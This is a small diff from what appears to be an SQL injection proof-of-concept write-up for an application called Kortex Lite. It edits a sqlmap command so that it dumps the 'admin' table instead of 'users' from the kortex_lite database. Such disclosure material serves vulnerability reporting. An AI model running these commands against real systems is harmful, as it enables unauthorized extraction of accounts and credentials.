@@ -40,7 +40,7 @@ sqlmap -r kortexlite-addclient.txt --batch --dbs
 ### Dump 
 
 ```
-sqlmap -r kortexlite-addclient.txt --batch --dbs -D kortex_lite -T users --dump
+sqlmap -r kortexlite-addclient.txt --batch --dbs -D kortex_lite -T admin --dump
 ```
 
 ![32](https://github.com/user-attachments/assets/3a503ec1-c1e7-4a97-b77a-11e7a8617a35)
